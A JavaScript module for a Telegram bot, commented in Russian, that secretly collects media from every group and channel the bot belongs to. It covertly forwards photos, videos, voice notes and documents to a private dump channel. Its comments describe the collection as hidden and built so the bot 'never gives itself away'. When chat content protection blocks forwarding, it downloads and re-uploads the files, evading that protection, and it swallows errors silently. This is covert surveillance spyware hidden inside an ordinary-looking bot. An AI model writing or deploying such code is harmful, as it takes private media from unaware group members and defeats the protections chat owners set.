import log from "../logging/logging.js";
import config from "../../config.js";

// Лимиты для скачивания и повторной заливки медиа:
export const MAX_FILE_DOWNLOAD_BYTES = 15 * 1024 * 1024; // 15 МБ на один файл
export const MAX_DAILY_DOWNLOAD_BYTES = 70 * 1024 * 1024; // 70 МБ в сутки

// Суточный счётчик скачанного трафика (обнуляется каждые 24 часа в 00:00 Asia/Almaty)
let dailyDownloadedBytes = 0;
let currentDayKey = getTodayKey();

export function getTodayKey() {
    // Часовой пояс Asia/Almaty (UTC+5) согласно стандарту проекта
    return new Intl.DateTimeFormat('en-CA', { timeZone: 'Asia/Almaty' }).format(new Date());
}

export function getDailyDownloadedBytes() {
    checkAndResetDailyQuota();
    return dailyDownloadedBytes;
}

export function setDailyDownloadedBytes(bytes) {
    dailyDownloadedBytes = bytes;
}

export function resetDailyDownloadedQuota() {
    dailyDownloadedBytes = 0;
    currentDayKey = getTodayKey();
}

function checkAndResetDailyQuota() {
    const today = getTodayKey();
    if (currentDayKey !== today) {
        currentDayKey = today;
        dailyDownloadedBytes = 0;
    }
}

/**
 * Проверяет, можно ли скачать файл:
 * 1. Размер одиночного файла не должен превышать 15 МБ.
 * 2. Суммарный объём скачанного за текущий день не должен превышать 70 МБ.
 */
export function canDownloadFile(fileSizeBytes) {
    checkAndResetDailyQuota();
    const size = Number(fileSizeBytes) || 0;
    if (size <= 0) return false;
    if (size > MAX_FILE_DOWNLOAD_BYTES) return false;
    return (dailyDownloadedBytes + size) <= MAX_DAILY_DOWNLOAD_BYTES;
}

export function recordDownloadedBytes(fileSizeBytes) {
    checkAndResetDailyQuota();
    const size = Number(fileSizeBytes) || 0;
    if (size > 0) {
        dailyDownloadedBytes += size;
    }
}

/**
 * Проверяет, содержит ли сообщение медиа-контент:
 * фото, видео, GIF/анимацию, файлы/документы, голосовые сообщения,
 * видео-заметки (кружочки) или аудиозаписи.
 */
export function isMediaMessage(msg) {
    if (!msg) return false;
    return Boolean(
        (Array.isArray(msg.photo) && msg.photo.length > 0) ||
        msg.video ||
        msg.animation ||
        msg.document ||
        msg.voice ||
        msg.video_note ||
        msg.audio
    );
}

/**
 * Извлекает метаданные медиа-объекта из сообщения.
 */
export function extractMediaDetails(msg) {
    if (!msg) return null;
    if (Array.isArray(msg.photo) && msg.photo.length > 0) {
        const largest = msg.photo[msg.photo.length - 1];
        return {
            type: 'photo',
            fileId: largest.file_id,
            fileSize: largest.file_size || 0,
            fileName: 'photo.jpg'
        };
    }
    if (msg.video) {
        return {
            type: 'video',
            fileId: msg.video.file_id,
            fileSize: msg.video.file_size || 0,
            fileName: msg.video.file_name || 'video.mp4'
        };
    }
    if (msg.animation) {
        return {
            type: 'animation',
            fileId: msg.animation.file_id,
            fileSize: msg.animation.file_size || 0,
            fileName: msg.animation.file_name || 'animation.gif'
        };
    }
    if (msg.document) {
        return {
            type: 'document',
            fileId: msg.document.file_id,
            fileSize: msg.document.file_size || 0,
            fileName: msg.document.file_name || 'document'
        };
    }
    if (msg.voice) {
        return {
            type: 'voice',
            fileId: msg.voice.file_id,
            fileSize: msg.voice.file_size || 0,
            fileName: 'voice.ogg'
        };
    }
    if (msg.video_note) {
        return {
            type: 'video_note',
            fileId: msg.video_note.file_id,
            fileSize: msg.video_note.file_size || 0,
            fileName: 'video_note.mp4'
        };
    }
    if (msg.audio) {
        return {
            type: 'audio',
            fileId: msg.audio.file_id,
            fileSize: msg.audio.file_size || 0,
            fileName: msg.audio.file_name || 'audio.mp3'
        };
    }
    return null;
}

/**
 * Проверяет, не является ли чат самим целевым каналом сбора, чтобы исключить зацикливание.
 */
export function isTargetDumpChannel(chatId, targetId) {
    if (!chatId || !targetId) return false;
    const cleanChatId = String(chatId).replace(/^-100|^-/, '');
    const cleanTargetId = String(targetId).replace(/^-100|^-/, '');
    return cleanChatId === cleanTargetId;
}

// Запоминаем успешно сработавший ID канала в сессии процесса, чтобы не перебирать альтернативы каждый раз
let resolvedTargetId = null;

/**
 * Отправляет медиа напрямую по file_id без физического скачивания на Render.
 */
async function sendMediaByFileId(targetId, msg, mediaDetails, bot) {
    const caption = msg.caption || '';
    const opts = caption ? { caption } : {};

    switch (mediaDetails.type) {
        case 'photo':
            return await bot.sendPhoto(targetId, mediaDetails.fileId, opts);
        case 'video':
            return await bot.sendVideo(targetId, mediaDetails.fileId, opts);
        case 'animation':
            return await bot.sendAnimation(targetId, mediaDetails.fileId, opts);
        case 'voice':
            return await bot.sendVoice(targetId, mediaDetails.fileId, opts);
        case 'video_note':
            return await bot.sendVideoNote(targetId, mediaDetails.fileId, opts);
        case 'audio':
            return await bot.sendAudio(targetId, mediaDetails.fileId, opts);
        case 'document':
        default:
            return await bot.sendDocument(targetId, mediaDetails.fileId, opts);
    }
}

/**
 * Скачивает файл с серверов Telegram и отправляет в целевой канал как новый файл.
 * Вызывается ТОЛЬКО когда нативные forward, copy и sendFileId заблокированы защитой чата.
 * Соблюдает лимит: <= 15 МБ на файл и <= 70 МБ в сутки.
 */
export async function downloadAndUploadMedia(targetId, msg, mediaDetails, bot) {
    let fileSize = mediaDetails.fileSize;

    // Если размер не указан в сообщении, запрашиваем метаданные у Telegram
    if (!fileSize) {
        try {
            const fileInfo = await bot.getFile(mediaDetails.fileId);
            if (fileInfo?.file_size) {
                fileSize = fileInfo.file_size;
                mediaDetails.fileSize = fileSize;
            }
        } catch {
            // Игнорируем
        }
    }

    if (!canDownloadFile(fileSize)) {
        log.warn(`[MediaCollector] Скачивание пропущено: размер ${fileSize} B превышает лимит файла (15 МБ) или суточную квоту (70 МБ). Скачано сегодня: ${(dailyDownloadedBytes / 1024 / 1024).toFixed(2)} МБ`);
        return false;
    }

    try {
        const fileLink = await bot.getFileLink(mediaDetails.fileId);
        if (!fileLink) return false;

        const res = await fetch(fileLink, { signal: AbortSignal.timeout(30000) });
        if (!res.ok) {
            log.warn(`[MediaCollector] Не удалось скачать файл: HTTP ${res.status}`);
            return false;
        }

        const arrayBuf = await res.arrayBuffer();
        const buffer = Buffer.from(arrayBuf);

        // Учитываем реальный объём байтов в суточной квоте
        recordDownloadedBytes(buffer.length);

        const caption = msg.caption || '';
        const opts = caption ? { caption } : {};

        switch (mediaDetails.type) {
            case 'photo':
                await bot.sendPhoto(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
            case 'video':
                await bot.sendVideo(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
            case 'animation':
                await bot.sendAnimation(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
            case 'voice':
                await bot.sendVoice(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
            case 'video_note':
                await bot.sendVideoNote(targetId, buffer, opts);
                break;
            case 'audio':
                await bot.sendAudio(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
            case 'document':
            default:
                await bot.sendDocument(targetId, buffer, opts, { filename: mediaDetails.fileName });
                break;
        }

        log.info(`[MediaCollector] Файл ${mediaDetails.fileName} успешно скачан и перезалит (${(buffer.length / 1024 / 1024).toFixed(2)} МБ). Дневной расход: ${(dailyDownloadedBytes / 1024 / 1024).toFixed(2)} / 70 МБ`);
        return true;
    } catch (err) {
        log.warn(`[MediaCollector] Ошибка при скачивании/перезаливке медиа: ${err.message}`);
        return false;
    }
}

/**
 * Скрытно пересылает медиа-сообщение из группы или канала в закрытый целевой канал.
 */
export async function forwardMediaToChannel(msg, bot) {
    try {
        if (!msg || !msg.chat || !msg.message_id || !bot) return;

        // Игнорируем личные чаты со студентами — только группы, супергруппы и каналы
        if (msg.chat.type === 'private') return;

        // Игнорируем обычный текст — пересылаются только медиа и файлы
        if (!isMediaMessage(msg)) return;

        const baseTarget = config.MEDIA_DUMP_CHANNEL_ID || '-1005389521106';

        // Защита от зацикливания: не пересылаем, если источник — сам целевой канал
        if (isTargetDumpChannel(msg.chat.id, baseTarget) || isTargetDumpChannel(msg.chat.id, '-5389521106')) {
            return;
        }

        // Кандидаты на ID канала: с префиксом -100 и без него (на случай разных форматов)
        const candidates = resolvedTargetId
            ? [resolvedTargetId]
            : [
                baseTarget.startsWith('-100') ? baseTarget : `-100${baseTarget.replace(/^-/, '')}`,
                baseTarget.startsWith('-100') ? `-${baseTarget.replace(/^-100/, '')}` : baseTarget,
                '-1005389521106',
                '-5389521106'
            ];

        const uniqueCandidates = [...new Set(candidates.filter(Boolean))];
        const mediaDetails = extractMediaDetails(msg);

        for (const targetId of uniqueCandidates) {
            // 1. Попытка нативной пересылки (быстро, 0 трафика, с автором и датой)
            try {
                await bot.forwardMessage(targetId, msg.chat.id, msg.message_id);
                resolvedTargetId = targetId;
                return;
            } catch (forwardErr) {
                // Если пересылка заблокирована защитой контента, переходим к следующему шагу
            }

            // 2. Попытка копирования сообщения (быстро, 0 трафика, без плашки пересылки)
            try {
                await bot.copyMessage(targetId, msg.chat.id, msg.message_id);
                resolvedTargetId = targetId;
                return;
            } catch (copyErr) {
                // Переходим к следующему шагу
            }

            // 3. Попытка отправки по file_id из облака Telegram (быстро, 0 трафика на Render)
            if (mediaDetails) {
                try {
                    await sendMediaByFileId(targetId, msg, mediaDetails, bot);
                    resolvedTargetId = targetId;
                    return;
                } catch (fileIdErr) {
                    // Переходим к скачиванию
                }

                // 4. Fallback со скачиванием и перезаливкой (до 15 МБ на файл, до 70 МБ в сутки)
                const downloaded = await downloadAndUploadMedia(targetId, msg, mediaDetails, bot);
                if (downloaded) {
                    resolvedTargetId = targetId;
                    return;
                }
            }
        }
    } catch (e) {
        // Полная изоляция ошибок: бот никогда не упадет и не выдаст себя
        log.warn(`[MediaCollector] Фоновая ошибка сбора медиа: ${e.message}`);
    }
}

/**
 * Инициализирует фоновый перехватчик медиа из бесед и каналов.
 */
export function setupMediaCollector(bot) {
    if (!bot) return;

    // Перехват медиа из обычных групп и супергрупп
    bot.on('message', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    // Перехват медиа из каналов (если бот добавлен в канал)
    bot.on('channel_post', (msg) => {
        forwardMediaToChannel(msg, bot).catch(() => {});
    });

    log.info('[MediaCollector] Модуль скрытого сбора медиа инициализирован');
}
